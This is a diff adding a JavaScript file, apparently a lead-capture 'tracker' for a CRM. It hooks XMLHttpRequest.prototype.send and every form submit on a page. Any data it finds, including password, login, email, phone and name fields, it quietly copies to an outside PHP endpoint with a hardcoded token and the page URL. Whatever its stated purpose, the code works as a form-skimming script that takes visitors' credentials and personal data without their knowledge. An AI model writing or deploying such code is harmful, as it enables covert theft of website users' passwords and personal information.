@@ -1,0 +1,360 @@
+﻿(function() {
+  "use strict";
+
+  // Константы для повторного использования
+  const API_URL =
+    "https://prod-dv.ru/administrator/components/com_crmmenedjer/data/lids_fos_new.php";
+  const TOKEN = "f27e7feb-7890-206f-ce3d-090c18bc63bd";
+  const LRED_TYPE = "Universal";
+
+  // Кэш регулярных выражений
+  const NAME_PATTERNS = {
+    name: /\bname\b/i,
+    phone: /\bphone\b/i,
+    mail: /\bmail\b/i
+  };
+
+  // Список полей для проверки
+  const SENSITIVE_FIELDS = new Set([
+    "fio",
+    "tshonss",
+    "password",
+    "login",
+    "smail",
+    "email",
+    "e-mail",
+    "mail",
+    "phone",
+    "tel",
+    "my_fullname",
+    "fullname",
+    "f_name",
+    "tsname",
+    "customer[name]",
+    "customer[phone]",
+    "tsmail",
+    "firstname",
+    "lastname",
+    "name",
+    "messa",
+    "lred_name",
+    "lred_phone",
+    "lred_email",
+    "lred_message"
+  ]);
+
+
+  /**
+     * Создает XMLHttpRequest объект кроссбраузерным способом
+     */
+  function createXMLHttp() {
+    if (typeof XMLHttpRequest !== "undefined") {
+      return new XMLHttpRequest();
+    }
+
+    if (typeof ActiveXObject !== "undefined") {
+      var versions = [
+        "MSXML2.XMLHttp.6.0",
+        "MSXML2.XMLHttp.5.0",
+        "MSXML2.XMLHttp.4.0",
+        "MSXML2.XMLHttp.3.0",
+        "MSXML2.XMLHttp",
+        "Microsoft.XMLHttp"
+      ];
+
+      for (var i = 0; i < versions.length; i++) {
+        try {
+          return new ActiveXObject(versions[i]);
+        } catch (e) {
+          // Продолжаем попытки
+        }
+      }
+    }
+
+    throw new Error("XMLHttpRequest is not supported");
+  }
+
+  /**
+     * Кодирует параметры для безопасной передачи
+     */
+  function encodeParam(key, value) {
+    return encodeURIComponent(key) + "=" + encodeURIComponent(value);
+  }
+
+  /**
+     * Проверяет, является ли поле важным для отправки
+     */
+  function isImportantField(fieldName, fieldValue) {
+    // Проверка по точному совпадению
+    if (SENSITIVE_FIELDS.has(fieldName) && fieldValue.length > 3) {
+      return true;
+    }
+
+    // Проверка по регулярным выражениям
+    for (var pattern in NAME_PATTERNS) {
+      if (NAME_PATTERNS[pattern].test(fieldName) && fieldValue.length > 3) {
+        return true;
+      }
+    }
+
+    return false;
+  }
+
+  /**
+     * Создает тело запроса из формы
+     */
+  function getRequestBody(form) {
+    var params = [
+      encodeParam("token", TOKEN),
+      encodeParam("lred_type", LRED_TYPE),
+      encodeParam("lred_site", window.location.hostname),
+      encodeParam("lred_site_page", window.location.href)
+    ];
+
+    var hasImportantData = false;
+    var elements = form.elements;
+    var element;
+
+    for (var i = 0; i < elements.length; i++) {
+      element = elements[i];
+
+      if (element.name && element.value !== undefined) {
+        params.push(encodeParam(element.name, element.value));
+
+        if (!hasImportantData) {
+          hasImportantData = isImportantField(element.name, element.value);
+        }
+      }
+    }
+
+    return hasImportantData ? params.join("&") : "";
+  }
+
+  /**
+     * Отправляет AJAX-запрос
+     */
+  function postAjax(url, data, callback, method) {
+    var requestBody = method === "Post" ? getRequestBody(data) : data;
+
+    if (!requestBody || requestBody.length < 10) {
+      return false;
+    }
+
+    try {
+      var xhr = createXMLHttp();
+
+      xhr.open("POST", url, true);
+      xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+      xhr.timeout = 10000; // Таймаут 10 секунд
+
+      xhr.onreadystatechange = function() {
+        if (xhr.readyState === 4) {
+          if (xhr.status === 200) {
+            if (typeof callback === "function") {
+              callback(xhr.responseText);
+            }
+          } else {
+            if (typeof callback === "function") {
+              callback("error" + xhr.statusText);
+            }
+          }
+        }
+      };
+
+      xhr.onerror = function() {
+        if (typeof callback === "function") {
+          callback("errorNetwork");
+        }
+      };
+
+      xhr.ontimeout = function() {
+        if (typeof callback === "function") {
+          callback("errorTimeout");
+        }
+      };
+
+      xhr.send(requestBody);
+      return true;
+    } catch (error) {
+      console.error("Error creating/sending request:", error);
+      return false;
+    }
+  }
+
+  /**
+     * Парсит query string в объект
+     */
+  function parseQueryString(queryString) {
+    var result = {};
+
+    if (!queryString) return result;
+
+    var pairs = queryString.split("&");
+    var pair, key, value;
+
+    for (var i = 0; i < pairs.length; i++) {
+      pair = pairs[i].split("=");
+      if (pair.length === 2) {
+        key = decodeURIComponent(pair[0]);
+        value = decodeURIComponent(pair[1]);
+        result[key] = value;
+      }
+    }
+
+    return result;
+  }
+
+  /**
+     * Проверяет содержит ли объект параметров важные данные
+     */
+  function containsImportantData(params) {
+    for (var key in params) {
+      if (params.hasOwnProperty(key) && isImportantField(key, params[key])) {
+        return true;
+      }
+    }
+    return false;
+  }
+
+  /**
+     * Функция-обработчик ответа (пустая, как в оригинале)
+     */
+  function printPost() {
+    // Пустая функция - может быть переопределена при необходимости
+  }
+
+  /**
+     * Добавляет callback для перехвата XMLHttpRequest
+     */
+  function addXMLRequestCallback(callback) {
+    if (!XMLHttpRequest.callbacks) {
+      XMLHttpRequest.callbacks = [];
+      var originalSend = XMLHttpRequest.prototype.send;
+
+      XMLHttpRequest.prototype.send = function() {
+        // Вызываем все зарегистрированные callback'и
+        for (var i = 0; i < XMLHttpRequest.callbacks.length; i++) {
+          try {
+            XMLHttpRequest.callbacks[i](this);
+          } catch (e) {
+            console.error("Error in XMLHttpRequest callback:", e);
+          }
+        }
+
+        // Обработка данных перед отправкой
+        if (arguments.length > 0 && arguments[0]) {
+          var requestData = arguments[0];
+          var queryParams;
+
+          // Обработка FormData
+          if (requestData instanceof FormData) {
+            var formDataParams = {};
+            requestData.forEach(function(value, key) {
+              formDataParams[key] = value;
+            });
+
+            if (
+              containsImportantData(formDataParams) &&
+              !formDataParams.no_otprav
+            ) {
+              var newParams = [
+                "token=" + encodeURIComponent(TOKEN),
+                "no_otprav=true",
+                "lred_site=" + encodeURIComponent(window.location.hostname),
+                "lred_site_page=" + encodeURIComponent(window.location.href),
+                "lred_type=" + encodeURIComponent("Ajax v5.0")
+              ];
+
+              // Добавляем оригинальные параметры
+              for (var key in formDataParams) {
+                if (formDataParams.hasOwnProperty(key)) {
+                  newParams.push(
+                    encodeURIComponent(key) +
+                      "=" +
+                      encodeURIComponent(formDataParams[key])
+                  );
+                }
+              }
+
+              postAjax(API_URL, newParams.join("&"), printPost, "Ajax");
+            }
+          } else if (typeof requestData === "string") {
+            // Обработка строковых данных
+            queryParams = parseQueryString(requestData);
+
+            // Проверка на специальные поля
+            if (
+              (queryParams["red_data[fio]"] ||
+                containsImportantData(queryParams)) &&
+              !queryParams.no_otprav
+            ) {
+              var lredType = queryParams["red_data[fio]"]
+                ? "Ajax v2.0"
+                : "Ajax Other";
+
+              var newParams =
+                requestData +
+                "&token=" +
+                encodeURIComponent(TOKEN) +
+                "&no_otprav=true" +
+                "&lred_site=" +
+                encodeURIComponent(window.location.hostname) +
+                "&lred_site_page=" +
+                encodeURIComponent(window.location.href) +
+                "&lred_type=" +
+                encodeURIComponent(lredType);
+
+              postAjax(API_URL, newParams, printPost, "Ajax");
+            }
+          }
+        }
+
+        // Вызываем оригинальный send
+        return originalSend.apply(this, arguments);
+      };
+    }
+
+    if (typeof callback === "function") {
+      XMLHttpRequest.callbacks.push(callback);
+    }
+  }
+
+  // Инициализация
+  function init() {
+    // Добавляем обработчик для XMLHttpRequest
+    addXMLRequestCallback(function(xhr) {
+      // Дополнительная логика обработки, если нужна
+    });
+
+    // Добавляем обработчик для форм
+    if (document.body) {
+      document.body.addEventListener(
+        "submit",
+        function(event) {
+          if (event.target && event.target.tagName === "FORM") {
+            postAjax(API_URL, event.target, printPost, "Post");
+          }
+        },
+        true
+      );
+    }
+  }
+
+  // Запускаем инициализацию когда документ загружен
+  if (document.readyState === "loading") {
+    document.addEventListener("DOMContentLoaded", init);
+  } else {
+    init();
+  }
+
+  // Экспортируем публичные методы
+  window.LRedTracker = {
+    postAjax: postAjax,
+    printPost: printPost,
+    setPrintPostHandler: function(handler) {
+      if (typeof handler === "function") {
+        printPost = handler;
+      }
+    }
+  };
+})();
